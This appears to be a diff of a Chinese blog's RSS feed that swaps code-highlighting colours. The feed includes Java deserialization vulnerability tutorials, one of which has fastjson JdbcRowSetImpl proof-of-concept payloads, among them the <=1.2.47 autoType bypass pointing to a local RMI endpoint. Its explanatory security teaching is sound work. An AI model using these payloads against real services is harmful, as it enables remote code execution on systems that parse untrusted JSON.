@@ -6,24 +6,24 @@
 &lt;p>&lt;code>sync.Once&lt;/code> 可以用于一些需要全局初始化的场景，比如初始化配置信息、数据库连接等。使用 sync.Once 可以确保这些初始化只会被执行一次，并且可以安全地被多个 goroutine 共享使用。&lt;/p>
 &lt;p>&amp;ndash; 来自 ChatGPT&lt;/p>&lt;/blockquote>
 &lt;p>其实和&lt;code>单例模式&lt;/code>差不多，但我想要的是让方法只执行一次，我魔改了一下，直接上代码吧。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> cn.typesafe.sync;
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">package&lt;/span> cn.typesafe.sync;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> lombok.SneakyThrows;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.util.concurrent.Callable;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> lombok.SneakyThrows;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.util.concurrent.Callable;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Once&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">volatile&lt;/span> T t &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Once&lt;/span>&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>T&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">volatile&lt;/span> T t &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#a6e22e">@SneakyThrows&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">public&lt;/span> T &lt;span style="color:#a6e22e">doOnce&lt;/span>(Callable&lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> action) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (t &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">synchronized&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				&lt;span style="color:#66d9ef">if&lt;/span> (t &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>					t &lt;span style="color:#f92672">=&lt;/span> action.&lt;span style="color:#a6e22e">call&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	@SneakyThrows
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> T &lt;span style="color:#50fa7b">doOnce&lt;/span>(Callable&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>T&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> action) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">if&lt;/span> (t &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#8be9fd;font-style:italic">synchronized&lt;/span> (&lt;span style="color:#ff79c6">this&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				&lt;span style="color:#ff79c6">if&lt;/span> (t &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>					t &lt;span style="color:#ff79c6">=&lt;/span> action.&lt;span style="color:#50fa7b">call&lt;/span>();
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				}
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			}
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">return&lt;/span> t;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">return&lt;/span> t;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>单元测试&lt;/p></description></item><item><title>Java 反序列化漏洞原理（六）fastjson 1.2.68 绕过原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</link><pubDate>Sat, 06 Nov 2021 17:16:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
@@ -75,38 +75,38 @@
 &lt;h2 id="fastjson--1247-poc">Fastjson &amp;lt;= 1.2.47 POC&lt;/h2>
 &lt;p>随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。&lt;/p>
 &lt;p>我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.alibaba.fastjson.JSON;
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.alibaba.fastjson.JSON;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Eval3&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval3&lt;/span> {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#a6e22e">parse&lt;/span>(payload);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#50fa7b">parse&lt;/span>(payload);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>不出意料的话会出现这样的错误提示信息：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>autoType is not support. com.sun.rowset.JdbcRowSetImpl
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>autoType is not support. com.sun.rowset.JdbcRowSetImpl
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是因为 fastjson 使用了黑名单机制，禁止将 &lt;code>com.sun.rowset.JdbcRowSetImpl&lt;/code> 反序列化。&lt;/p>
 &lt;p>下面我们使用新的 POC 进行测试，又可以利用成功了。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.alibaba.fastjson.JSON;
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.alibaba.fastjson.JSON;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Eval5&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval5&lt;/span> {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#a6e22e">parse&lt;/span>(payload);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#50fa7b">parse&lt;/span>(payload);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>payload 格式化之后如下：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>: {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;java.lang.Class&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;val&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f1fa8c">&amp;#34;a&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;java.lang.Class&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;val&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	},
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#e6db74">&amp;#34;b&amp;#34;&lt;/span>: {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;dataSourceName&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;rmi://localhost:1099/Exploit&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#e6db74">&amp;#34;autoCommit&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f1fa8c">&amp;#34;b&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;dataSourceName&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;rmi://localhost:1099/Exploit&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;autoCommit&amp;#34;&lt;/span>: &lt;span style="color:#ff79c6">true&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="fastjson--1247-绕过原理">Fastjson &amp;lt;= 1.2.47 绕过原理&lt;/h2>
@@ -164,69 +164,69 @@ Object obj = context.lookup(&amp;#34;rmi://localhost:1099/Object&amp;#34;);
 &lt;h3 id="0x00">0x00&lt;/h3>
 &lt;p>在上一节中我们介绍了 Java 反序列化漏洞的成因和利用 &lt;code>commons-collections 3.1&lt;/code> 搭配 &lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code> 实现远程命令执行的方式。但&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code> 的问题已经在最新版 jdk 中修复，可利用范围仅能够局限于旧版本的jdk。经过安全人员的审计，另一个类 &lt;code>javax.management.BadAttributeValueExpException&lt;/code> 出现在了安全人员的视野。&lt;/p>
 &lt;p>&lt;code>javax.management.BadAttributeValueExpException&lt;/code> 继承自 &lt;code>java.lang.Exception&lt;/code>，&lt;code>java.lang.Exception&lt;/code> 继承自 &lt;code>java.lang.Throwable&lt;/code>，而 &lt;code>java.lang.Throwable&lt;/code> 实现了 &lt;code>java.io.Serializable&lt;/code>。因此 &lt;code>javax.management.BadAttributeValueExpException&lt;/code> 符合了 &lt;strong>可序列化&lt;/strong> 这个要求，同样的它也增加了 &lt;code>readObject&lt;/code> 方法，这个类的完整代码如下：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> javax.management;
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">package&lt;/span> javax.management;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.io.IOException;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.io.ObjectInputStream;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/**
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * Thrown when an invalid MBean attribute is passed to a query
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * constructing method. This exception is used internally by JMX
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * during the evaluation of a query. User code does not usually
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * see it.
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * @since 1.5
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">BadAttributeValueExpException&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.io.IOException;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.io.ObjectInputStream;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Serial version */&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> serialVersionUID &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>3105272988410493376L;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">/**
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * Thrown when an invalid MBean attribute is passed to a query
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * constructing method. This exception is used internally by JMX
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * during the evaluation of a query. User code does not usually
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * see it.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> *
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * @since 1.5
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">BadAttributeValueExpException&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">extends&lt;/span> Exception {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * @serial A string representation of the attribute that originated this exception.
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * for example, the string value can be the return of {@code attribute.toString()}
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> Object val;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * Constructs a BadAttributeValueExpException using the specified Object to
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * create the toString() value.
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * @param val the inappropriate value.
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">BadAttributeValueExpException&lt;/span> (Object val) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">val&lt;/span> &lt;span style="color:#f92672">=&lt;/span> val &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> : val.&lt;span style="color:#a6e22e">toString&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Serial version */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> &lt;span style="color:#8be9fd">long&lt;/span> serialVersionUID &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">-&lt;/span>3105272988410493376L;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/**
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * @serial A string representation of the attribute that originated this exception.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * for example, the string value can be the return of {@code attribute.toString()}
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> Object val;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/**
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * Constructs a BadAttributeValueExpException using the specified Object to
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * create the toString() value.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> *
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * @param val the inappropriate value.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
